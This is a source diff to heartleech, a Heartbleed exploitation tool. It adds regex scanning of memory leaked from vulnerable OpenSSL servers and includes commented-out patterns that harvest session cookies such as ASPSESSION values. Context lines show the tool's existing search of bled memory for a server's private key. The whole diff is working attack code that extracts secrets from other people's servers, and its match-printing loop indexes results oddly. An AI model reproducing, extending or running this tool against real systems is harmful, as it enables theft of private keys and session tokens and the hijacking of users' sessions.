@@ -131,6 +131,16 @@ enum {
 };
 
 /**
+ * Some PCRE patterns for search content
+ */
+struct CapturePatterns {
+    struct pcre **pat;
+    struct pcre_extra **extra;
+    size_t count;
+};
+
+
+/**
  * Per connection data that is flushed at the end of the connection
  */
 struct Connection {
@@ -279,6 +289,7 @@ struct DumpArgs {
     } proxy;
     struct TargetList targets;
     unsigned default_port;
+    struct CapturePatterns patterns;
 };
 
 /******************************************************************************
@@ -303,75 +314,6 @@ int DEBUG_MSG(const char *fmt, ...)
     vfprintf(stderr, fmt, marker);
     va_end(marker);
     return -1;
-}
-
-/******************************************************************************
- ******************************************************************************/
-struct pcre;
-struct pcre_extra;
-
-typedef struct pcre *(*PCRE_compile)(const char *pattern, int options,
-                            const char **errptr, int *erroffset,
-                            const unsigned char *tableptr);
-typedef int (*PCRE_exec)(const struct pcre *code, const struct pcre_extra *extra,
-                const char *subject, int length, int startoffset,
-                int options, int *ovector, int ovecsize);
-typedef const char *(*PCRE_version)(void);
-
-struct PCRE {
-    PCRE_compile compile;
-    PCRE_exec exec;
-    PCRE_version version;
-} PCRE;
-
-/******************************************************************************
- * Load the PCRE library for capturing patterns.
- ******************************************************************************/
-static void
-load_pcre(void)
-{
-    void *h;
-    const char *library_names[] = {
-#if defined(__linux__)
-        "libpcre.so",
-#elif defined(WIN32)
-        "libpcre.dll",
-#else
-        "libpcre.dylib", 
-#endif
-        0 };
-    size_t i;
-    
-    /* look for a PCRE library */
-    for (i=0; library_names[i]; i++) {
-        h = dlopen(library_names[i], RTLD_LAZY);
-        if (h)
-            break;
-#ifndef WIN32
-        fprintf(stderr, "%s: %s\n", library_names[i], dlerror());
-#endif
-    }
-    if (h == NULL)
-        return;
-    
-    /* load symbols */
-    PCRE.compile = (PCRE_compile)dlsym(h, "pcre_compile");
-    if (PCRE.compile == NULL) {
-        perror("pcre_compile");
-        return;
-    }
-    PCRE.exec = (PCRE_exec)dlsym(h, "pcre_exec");
-    if (PCRE.exec == NULL) {
-        perror("pcre_exec");
-        return;
-    }
-    PCRE.version = (PCRE_version)dlsym(h, "pcre_version");
-    if (PCRE.version == NULL) {
-        perror("pcre_version");
-        return;
-    }
-    
-    fprintf(stderr, "PCRE library: %s\n", PCRE.version());
 }
 
 
@@ -404,6 +346,125 @@ hexdump(const unsigned char *buf, size_t len)
         printf("\n");
     }
 }
+
+/******************************************************************************
+ ******************************************************************************/
+struct pcre;
+struct pcre_extra;
+typedef struct pcre *(*PCRE_compile)(const char *pattern, int options,
+                            const char **errptr, int *erroffset,
+                            const unsigned char *tableptr);
+typedef int (*PCRE_exec)(const struct pcre *code, 
+                const struct pcre_extra *extra, const char *subject, int length,
+                int startoffset, int options, int *ovector, int ovecsize);
+typedef struct pcre_extra *(*PCRE_study)(const struct pcre *code, int options,
+                const char **errptr);
+typedef const char *(*PCRE_version)(void);
+struct PCRE {
+    PCRE_compile compile;
+    PCRE_exec exec;
+    PCRE_version version;
+    PCRE_study study;
+} PCRE;
+
+
+
+
+/******************************************************************************
+ ******************************************************************************/
+static void
+pattern_add(struct CapturePatterns *pats, const char *pattern)
+{
+    struct pcre *p;
+    struct pcre_extra *extra;
+    const char *err;
+    int err_offset;
+
+    if (PCRE.version == NULL)
+        return;
+
+    p = PCRE.compile(pattern, 0, &err, &err_offset, 0);
+    if (p == NULL) {
+        int i;
+        fprintf(stderr, "PCRE: %s\n", err);
+        fprintf(stderr, "      %s\n", pattern);
+        for (i=0; i<6+err_offset; i++)
+            fprintf(stderr, " ");
+        fprintf(stderr, "^\n");
+        return;
+    }
+    extra = PCRE.study(p, 0, &err);
+
+    if (pats->count == 0) {
+        pats->pat = malloc(sizeof(p));
+        pats->extra = malloc(sizeof(extra));
+    } else {
+        pats->pat = realloc(pats->pat, sizeof(p) * (pats->count+1));
+        pats->extra = realloc(pats->extra, sizeof(extra) * (pats->count+1));
+    }
+
+    pats->pat[pats->count] = p;
+    pats->extra[pats->count] = extra;
+    pats->count++;
+}
+
+
+/******************************************************************************
+ * Load the PCRE library for capturing patterns.
+ ******************************************************************************/
+static void
+load_pcre(void)
+{
+    void *h;
+    const char *library_names[] = {
+#if defined(__linux__)
+        "libpcre.so",
+#elif defined(WIN32)
+        "pcre3.dll",
+#else
+        "libpcre.dylib", 
+#endif
+        0 };
+    size_t i;
+    
+    /* look for a PCRE library */
+    for (i=0; library_names[i]; i++) {
+        h = dlopen(library_names[i], RTLD_LAZY);
+        if (h)
+            break;
+#ifndef WIN32
+        fprintf(stderr, "%s: %s\n", library_names[i], dlerror());
+#endif
+    }
+    if (h == NULL)
+        return;
+    
+    /* load symbols */
+    PCRE.compile = (PCRE_compile)dlsym(h, "pcre_compile");
+    if (PCRE.compile == NULL) {
+        perror("pcre_compile");
+        return;
+    }
+    PCRE.study = (PCRE_study)dlsym(h, "pcre_study");
+    if (PCRE.study == NULL) {
+        perror("pcre_study");
+        return;
+    }
+    PCRE.exec = (PCRE_exec)dlsym(h, "pcre_exec");
+    if (PCRE.exec == NULL) {
+        perror("pcre_exec");
+        return;
+    }
+    PCRE.version = (PCRE_version)dlsym(h, "pcre_version");
+    if (PCRE.version == NULL) {
+        perror("pcre_version");
+        return;
+    }
+    
+    fprintf(stderr, "PCRE library: %s\n", PCRE.version());
+}
+
+
 
 /******************************************************************************
  * This is the "callback" that receives the hearbeat data. Since 
@@ -817,6 +878,7 @@ process_bleed(const struct DumpArgs *args_in,
 
     /* do a live analysis of the bleeding data */
     if (args->is_auto_pwn) {
+
         if (find_private_key(n, e, buf, buf_size)) {
             printf("key found!\n");
             exit(1);
@@ -1869,13 +1931,43 @@ end:
 }
 
 
+/******************************************************************************
+ ******************************************************************************/
+static void
+scan_patterns(const struct DumpArgs *args, const unsigned char *buf, size_t buf_size)
+{
+    size_t i;
+
+    for (i=0; i<args->patterns.count; i++) {
+        int x;
+        int j;
+        int ovector[1024*3];
+
+        x = PCRE.exec(args->patterns.pat[i], 
+                        args->patterns.extra[i],
+                        buf, buf_size, 0, 0, 
+                        ovector, 1024*3);
+        for (j=0; j<x; j++) {
+            int k;
+            for (k=ovector[i*j]; k<ovector[i*j+1]; k++) {
+                if (isprint(buf[k]))
+                    printf("%c", buf[k]);
+                else
+                    printf(".");
+            }
+            printf("\n");
+        }
+    }
+}
+
 
 /******************************************************************************
  * Process the files produced by this tool, or other tools, looking for
  * the private key in the given certificate.
  ******************************************************************************/
 static void
-process_offline_file(const char *filename_cert, const char *filename_bin)
+process_offline_file(const struct DumpArgs *args, 
+                        const char *filename_cert, const char *filename_bin)
 {
     FILE *fp;
     X509 *cert;
@@ -1888,19 +1980,21 @@ process_offline_file(const char *filename_cert, const char *filename_bin)
     /*
      * Read in certificate
      */
-    fp = fopen(filename_cert, "rb");
-    if (fp == NULL) {
-        perror(filename_cert);
-        return;
+    if (filename_cert) {
+        fp = fopen(filename_cert, "rb");
+        if (fp == NULL) {
+            perror(filename_cert);
+            return;
+        }
+        cert = PEM_read_X509(fp, NULL, NULL, NULL);
+	    if (cert == NULL) {
+		    fprintf(stderr, "%s: error parsing certificate\n", filename_cert);
+		    fclose(fp);
+		    return;
+	    }
+        fclose(fp);
+        parse_cert(cert, name, &n, &e);
     }
-    cert = PEM_read_X509(fp, NULL, NULL, NULL);
-	if (cert == NULL) {
-		fprintf(stderr, "%s: error parsing certificate\n", filename_cert);
-		fclose(fp);
-		return;
-	}
-    fclose(fp);
-    parse_cert(cert, name, &n, &e);
 
     /*
      * Read in the file to process
@@ -1918,15 +2012,21 @@ process_offline_file(const char *filename_cert, const char *filename_bin)
         if (bytes_read == 0)
             break;
 
-        if (find_private_key(n, e, buf, bytes_read)) {
-            fprintf(stderr, "found: offset=%llu\n", offset);
-            exit(1);
+        if (args->patterns.count) {
+            scan_patterns(args, buf, bytes_read);
+        }
+
+        if (filename_cert) {
+            if (find_private_key(n, e, buf, bytes_read)) {
+                fprintf(stderr, "found: offset=%llu\n", offset);
+                exit(1);
+            }
         }
 
         offset += bytes_read;
 
         if (offset > last_offset + 1024*1024) {
-            printf("%llu bytes read\n", offset);
+            printf("%llu bytes read          \r", offset);
             last_offset = offset;
         }
     }
@@ -2380,6 +2480,10 @@ main(int argc, char *argv[])
     fprintf(stderr, "from https://github.com/robertdavidgraham/heartleech\n");
 
     load_pcre();
+
+    //pattern_add(&args.patterns, "[a-zA-Z]*[sS][eE][sS][sS][iI][oO][nN][a-zA-Z0-9=]*;");
+    //pattern_add(&args.patterns, "ASPSESSION[A-Z]*=[A-Z]*;");
+
     
     /*
      * Print usage information
@@ -2472,9 +2576,9 @@ main(int argc, char *argv[])
             if (args.cert_filename == 0) {
                     ERROR_MSG("[-] must specify certificate file to use\n");
                     ERROR_MSG("[-]   heartleech --cert <filename> ...\n");
-                    exit(1);
+                    //exit(1);
             }
-            process_offline_file(args.cert_filename, args.offline_filename);
+            process_offline_file(&args, args.cert_filename, args.offline_filename);
             return 0;
     }
 
